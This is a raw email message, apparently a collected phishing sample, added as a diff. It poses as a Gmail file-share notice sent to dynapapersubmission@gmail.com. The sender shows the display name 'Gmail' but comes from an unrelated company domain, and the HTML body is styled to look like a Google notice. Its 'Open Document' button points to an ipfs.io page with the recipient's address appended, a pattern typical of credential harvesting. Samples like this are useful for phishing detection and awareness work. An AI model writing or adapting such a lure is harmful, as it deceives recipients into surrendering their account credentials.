@@ -1,0 +1,243 @@
+X-GM-THRID: 1805391031066943610
+X-Gmail-Labels: Inbox,Opened,Category Personal,Starred
+Delivered-To: dynapapersubmission@gmail.com
+Received: by 2002:a05:6214:5e96:b0:6b5:f1e5:885c with SMTP id mm22csp2662027qvb;
+        Tue, 23 Jul 2024 10:17:37 -0700 (PDT)
+X-Google-Smtp-Source: AGHT+IGBYmwEiBAHSNvd1rOUoRdUDWmKm1GurbdAlVGnOcdPCZ3TpjTvhc2P2aTh7n2EwtiIs4Nh
+X-Received: by 2002:adf:a159:0:b0:368:2f01:307a with SMTP id ffacd0b85a97d-369dee57b0amr2669905f8f.46.1721755057608;
+        Tue, 23 Jul 2024 10:17:37 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1721755057; cv=none;
+        d=google.com; s=arc-20160816;
+        b=nhaKhEYiKBnBVbcBaw2ghrh1fXGygYMT2CpG7N/NbWFmZrhGmEJvZST9BiRQDB59mS
+         LRy31fBy4lPXsZT/9t480wcNszl7G5SmllL52r+jNb4hLH9IrK5JuyCrc5vAhGp8FGDa
+         s2aFpvM8dRBXRNnfXCe79o4v3l+Ma915i3C9L7d/zPJ6i3jFARyRv1ciFgTV8kRS6SkN
+         Ow6PA6Mn8xqC1RYcRyJooge9Al5Xo2s0Pv3uRC/aJuIWuzWiFN3jN88+Ts/tkrOjVUb1
+         t8WsOrExFGPTndkF4nd84wNASEKQnTN/H/Q3ksUTPbzE68Fgi6xn1Li4gBqW4Ygft19p
+         J8EQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:to
+         :from:dkim-signature:dkim-filter;
+        bh=t3aLvxzlOb+rU9HgiEpKUHWY6J2radH3HXLLp4xUDLw=;
+        fh=9jKT+T1Uw0A+5dzq86MtnniWAZXbyTpzU841KB0pgzA=;
+        b=YOvwsJX3oyOzrOIwzF4YYPtT5dH+crIRNje+gRB18jWwybry9ppurE9J3YqIJ1771Q
+         tuLJsxYtRk8H+gI+jQeROV8OC6HQxUKpCo0TPILoB7DUHGUvqwDI+QQ4nnaV+/GqaQSh
+         UN+CKyyiQ2bj37eDWSdy6dnWuA8tmvm4t/7F88MFvayi0FXyF2jFCFi3DOAo9rYp6ZzB
+         lAUDwJnu7+mLxP6aHxD9J+N0Un6iUlopnfLjfCLK+8i4IqsFyXMi1tHEjyC9nHJZtG8X
+         uXkI5KH+fyqe2uoYCfA0lnngQ87SYHV4w14y3dNSsYj2CC2TVQQ0YtdfMRZX2oe/aBGT
+         6MeQ==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=neutral (body hash did not verify) header.i=@ghazibrothers.com.pk header.s=D7FC0676-1A1B-11EB-8F25-EA62A861CD47 header.b=R7Y6CgqW;
+       spf=pass (google.com: domain of ulfat.shahzad@ghazibrothers.com.pk designates 103.125.240.152 as permitted sender) smtp.mailfrom=ulfat.shahzad@ghazibrothers.com.pk
+Return-Path: <ulfat.shahzad@ghazibrothers.com.pk>
+Received: from email.ghazibrothers.com.pk (email.ghazibrothers.com.pk. [103.125.240.152])
+        by mx.google.com with ESMTPS id ffacd0b85a97d-369e365d8desi885077f8f.165.2024.07.23.10.17.36
+        for <dynapapersubmission@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 23 Jul 2024 10:17:37 -0700 (PDT)
+Received-SPF: pass (google.com: domain of ulfat.shahzad@ghazibrothers.com.pk designates 103.125.240.152 as permitted sender) client-ip=103.125.240.152;
+Authentication-Results: mx.google.com;
+       dkim=neutral (body hash did not verify) header.i=@ghazibrothers.com.pk header.s=D7FC0676-1A1B-11EB-8F25-EA62A861CD47 header.b=R7Y6CgqW;
+       spf=pass (google.com: domain of ulfat.shahzad@ghazibrothers.com.pk designates 103.125.240.152 as permitted sender) smtp.mailfrom=ulfat.shahzad@ghazibrothers.com.pk
+Received: from localhost (localhost [127.0.0.1])
+	by email.ghazibrothers.com.pk (Postfix) with ESMTP id 1AAABB33792D7
+	for <dynapapersubmission@gmail.com>; Tue, 23 Jul 2024 22:15:43 +0500 (PKT)
+Received: from email.ghazibrothers.com.pk ([127.0.0.1])
+	by localhost (email.ghazibrothers.com.pk [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id Q5A0Ae-kTU5y for <dynapapersubmission@gmail.com>;
+	Tue, 23 Jul 2024 22:15:42 +0500 (PKT)
+Received: from localhost (localhost [127.0.0.1])
+	by email.ghazibrothers.com.pk (Postfix) with ESMTP id C1043957EB392
+	for <dynapapersubmission@gmail.com>; Tue, 23 Jul 2024 22:01:18 +0500 (PKT)
+DKIM-Filter: OpenDKIM Filter v2.10.3 email.ghazibrothers.com.pk C1043957EB392
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+	d=ghazibrothers.com.pk; s=D7FC0676-1A1B-11EB-8F25-EA62A861CD47;
+	t=1721754078; bh=skGp76ZhphDunoRqTcLC8bcjN++Okh9HsGNja4jzvI8=;
+	h=From:To:Date:Message-ID:MIME-Version;
+	b=R7Y6CgqWWjO5ePOw/qiN74tyOFPmBoF2JfOGf+hNA//3dxkr8pQf8OXnf3r0G0q40
+	 hfOLhfUOUHKIKkOnl1tzJbz5EaeZD2w121sP+a4SWExvoJO5h9f2skfx7DjZNdTdkf
+	 sWEqB5oujiLz5Qra5Oa/j22bOfpWQx5JMINmRR9/LMXAX67L6fI5pfWXjuO9QrOGLN
+	 T/bI620DKVjRe/7eYu4R7iN1PPug9h0BiIYggisBbLt7SLNFRl09eujnsR6x6t+L4I
+	 lK7HgwCouASVgFrmXZWdREhRBumpRt15QlJqc90ys4+Oz+nLkeTzBEf+hmFrDk2Ug6
+	 g/laN+8VpBcZw==
+X-Amavis-Modified: Mail body modified (using disclaimer) -
+	email.ghazibrothers.com.pk
+X-Virus-Scanned: amavisd-new at ghazibrothers.com.pk
+Received: from email.ghazibrothers.com.pk ([127.0.0.1])
+	by localhost (email.ghazibrothers.com.pk [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id yTovSTndRby1 for <dynapapersubmission@gmail.com>;
+	Tue, 23 Jul 2024 22:01:18 +0500 (PKT)
+Received: from ghazibrothers.com.pk (unknown [197.255.16.210])
+	by email.ghazibrothers.com.pk (Postfix) with ESMTPSA id 755B7934E77B0
+	for <dynapapersubmission@gmail.com>; Tue, 23 Jul 2024 21:51:21 +0500 (PKT)
+From: Gmail  <ulfat.shahzad@ghazibrothers.com.pk>
+To: dynapapersubmission@gmail.com
+Subject: Shared File by support@gmail.com 23/7/2024 09:51:18
+Date: 23 Jul 2024 09:51:18 -0700
+Message-ID: <20240723095118.24F1CC8C7D28209D@ghazibrothers.com.pk>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<table style=3D"FONT-SIZE: 16px; FONT-FAMILY: Roboto, RobotoDraft, Helvetic=
+a, Arial, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; BOR=
+DER-LEFT-COLOR: rgb(238,238,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); F=
+ONT-STYLE: normal; BORDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOW=
+S: 2; BORDER-RIGHT-COLOR: rgb(238,238,238); LETTER-SPACING: normal; font-va=
+riant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" cellspacing=3D"0" =
+cellpadding=3D"0" width=3D"604" bgcolor=3D"#f5f6fa" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238);=
+ BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238)=
+; BORDER-RIGHT-COLOR: rgb(238,238,238)">
+<TR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)">
+<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(0,130,59) 4px solid; B=
+ORDER-LEFT-COLOR: rgb(238,238,238); PADDING-BOTTOM: 0px; BORDER-BOTTOM-COLO=
+R: rgb(238,238,238); PADDING-TOP: 20px; PADDING-LEFT: 0px; MARGIN: 0px; BOR=
+DER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: 0px" align=3D"center">
+<FONT style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, serif, EmojiFont=
+; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); =
+BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238)=
+" size=3D3>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Gen=
+eva, Verdana, sans-serif, serif, EmojiFont; BORDER-TOP-COLOR: rgb(238,238,2=
+38); BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(28,28,28); BORDER-BOTT=
+OM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238)'><SPAN sty=
+le=3D"BOX-SIZING: border-box; FONT-SIZE: 30px; BORDER-TOP-COLOR: rgb(238,23=
+8,238); BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,2=
+38,238); BORDER-RIGHT-COLOR: rgb(238,238,238)">
+dynapapersubmission@gmail.com Document.</SPAN></SPAN></FONT></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)">
+<td style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); PADDING-BOTTOM: 20px; BORDER-BOTTOM-COLO=
+R: rgb(238,238,238); PADDING-TOP: 20px; PADDING-LEFT: 0px; MARGIN: 0px; BOR=
+DER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: 0px" width=3D"260" align=
+=3D"center">support@gmail.com</TD></TR>
+<TR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)">
+<td style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); PADDING-BOTTOM: 20px; BORDER-BOTTOM-COLO=
+R: rgb(238,238,238); MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238)" ali=
+gn=3D"center"><FONT style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, se=
+rif, EmojiFont; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(=
+238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rg=
+b(238,238,238)" size=3D3>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 0.9em; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238)=
+; BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(22,35,58); PADDING-BOTTOM=
+: 0px; BORDER-BOTTOM-COLOR: rgb(238,238,238); PADDING-TOP: 0px; PADDING-LEF=
+T: 60px; MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: =
+60px'>
+<A style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BOR=
+DER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(17,85,204); OUTLINE-WIDTH: 0px=
+; BORDER-BOTTOM-COLOR: rgb(238,238,238); OUTLINE-STYLE: none; BORDER-RIGHT-=
+COLOR: rgb(238,238,238); OUTLINE-COLOR: invert; BACKGROUND-COLOR: transpare=
+nt; text-decoration-line: none" rel=3Dnoreferrer target=3D_blank>&nbsp;has =
+sent you a file&nbsp;</A></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 0.9em; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238)=
+; BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(22,35,58); PADDING-BOTTOM=
+: 0px; BORDER-BOTTOM-COLOR: rgb(238,238,238); PADDING-TOP: 0px; PADDING-LEF=
+T: 60px; MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: =
+60px'>Here is the copy of the shared gmail.com&nbsp;Document</P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 0.9em; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238)=
+; BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(22,35,58); PADDING-BOTTOM=
+: 0px; BORDER-BOTTOM-COLOR: rgb(238,238,238); PADDING-TOP: 0px; PADDING-LEF=
+T: 60px; MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: =
+60px'>
+<BR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)"></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 0.9em; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238)=
+; BORDER-LEFT-COLOR: rgb(238,238,238); COLOR: rgb(22,35,58); PADDING-BOTTOM=
+: 0px; BORDER-BOTTOM-COLOR: rgb(238,238,238); PADDING-TOP: 0px; PADDING-LEF=
+T: 60px; MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: =
+60px'></P></FONT></TD></TR></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 16px; FONT-FAMILY: Roboto, RobotoDraft, Helvetic=
+a, Arial, sans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; BOR=
+DER-LEFT-COLOR: rgb(238,238,238); FONT-WEIGHT: 400; COLOR: rgb(34,34,34); F=
+ONT-STYLE: normal; BORDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOW=
+S: 2; BORDER-RIGHT-COLOR: rgb(238,238,238); LETTER-SPACING: normal; font-va=
+riant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" cellspacing=3D"0" =
+cellpadding=3D"0" width=3D"604" bgcolor=3D"#f5f6fa" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238);=
+ BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238)=
+; BORDER-RIGHT-COLOR: rgb(238,238,238)">
+<TR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)">
+<td style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); PADDING-BOTTOM: 40px; BORDER-BOTTOM-COLO=
+R: rgb(238,238,238); PADDING-TOP: 5px; PADDING-LEFT: 162px; MARGIN: 0px; BO=
+RDER-RIGHT-COLOR: rgb(238,238,238); PADDING-RIGHT: 162px" height=3D"66" ali=
+gn=3D"center">
+<P style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); MAR=
+GIN-TOP: 0px; BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb=
+(238,238,238); BORDER-RIGHT-COLOR: rgb(238,238,238)">
+&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<A style=3D"BOX-SIZING: border-box; FONT-S=
+IZE: 18px; FONT-FAMILY: Arial; COLOR: rgb(255,255,255); OUTLINE-WIDTH: 0px;=
+ PADDING-BOTTOM: 16px; PADDING-TOP: 16px; OUTLINE-STYLE: none; PADDING-LEFT=
+: 32px; MARGIN: 0em 0px; DISPLAY: inline-block; OUTLINE-COLOR: invert; PADD=
+ING-RIGHT: 32px; BACKGROUND-COLOR: rgb(0,130,59); text-decoration-line: non=
+e; border-radius: 14px" href=3D"https://ipfs.io/ipfs/bafybeidijumfgz26wrocg=
+t36nwish73mizgcbamqfkzuen7gzwna76nxna#dynapapersubmission@gmail.com"=20
+rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https://www.google=
+=2Ecom/url?q=3Dhttps://ipfs.io/ipfs/bafybeicmh5zdpxjxdjndiptbigtpqurxyk4e7x=
+2alg4xsqlroxj5zpoejq?e%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1=
+721749956526000&amp;usg=3DAOvVaw36du6eKefzfKOURYJ-6Yrq">
+<FONT style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, serif, EmojiFont=
+; BORDER-TOP-COLOR: rgb(238,238,238); VERTICAL-ALIGN: inherit; BORDER-LEFT-=
+COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGH=
+T-COLOR: rgb(238,238,238)"><FONT style=3D"BOX-SIZING: border-box; BORDER-TO=
+P-COLOR: rgb(238,238,238); VERTICAL-ALIGN: inherit; BORDER-LEFT-COLOR: rgb(=
+238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rg=
+b(238,238,238)">Open Document</FONT></FONT></A></P>
+</TD></TR>
+<TR style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 1em; BORDER-TOP-COLOR: rgb(=
+238,238,238); BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb=
+(238,238,238); MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238); LINE-HEIG=
+HT: normal"><FONT style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, seri=
+f, EmojiFont; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR: rgb(23=
+8,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COLOR: rgb(=
+238,238,238); LINE-HEIGHT: normal" size=3D3>
+<SPAN style=3D'BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 1=
+1px; FONT-FAMILY: "Trebuchet MS", Helvetica, sans-serif, serif, EmojiFont; =
+BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: rgb(238,238,238); VERTICAL-ALIGN=
+: baseline; BORDER-BOTTOM-WIDTH: 0px; BORDER-LEFT-COLOR: rgb(238,238,238); =
+PADDING-BOTTOM: 0px; BORDER-BOTTOM-COLOR: rgb(238,238,238); PADDING-TOP: 0p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-RIGHT-COLOR: rgb(238,238,238); LI=
+NE-HEIGHT: 0.2; PADDING-RIGHT: 0px;=20
+BORDER-TOP-WIDTH: 0px'>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
+sp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &=
+nbsp; &nbsp;If you wish to automatically perform this action next time: uns=
+ubscribe Now</SPAN></FONT></TD></TR></TBODY></TABLE>
+<br>=
+<html> <body>  <br><span style=3D"font-weight:900">Disclaimer:</span><br>=0A
+    The information contained in and accompanying this communication may be confidential, subject to legal privilege, or otherwise protected from disclosure, and is intended solely for the use of the intended recipient(s). If you are not the intended recipient of this communication, please delete and destroy all copies in your possession, notify the sender that you have received this communication in error, and note that any review or dissemination of, or the taking of any action in reliance on, this communication is expressly prohibited. Email messages may contain computer viruses or other defects, may not be accurately replicated on other systems, or may be intercepted, deleted or interfered with without the knowledge of the sender or the intended recipient. Ghazi Brothers makes no warranties in relation to these matters. Please note that Ghazi Brothers reserves the right to intercept, monitor, and retain email messages to and from its systems as permitted by applicable law. If you
+  are not comfortable with the risks associated with e-mail messages, you may decide not to use email to communicate with Ghazi Brothers.=0A
+</span> </body> </html>=0A
+<br>=
+</BODY></HTML>
+
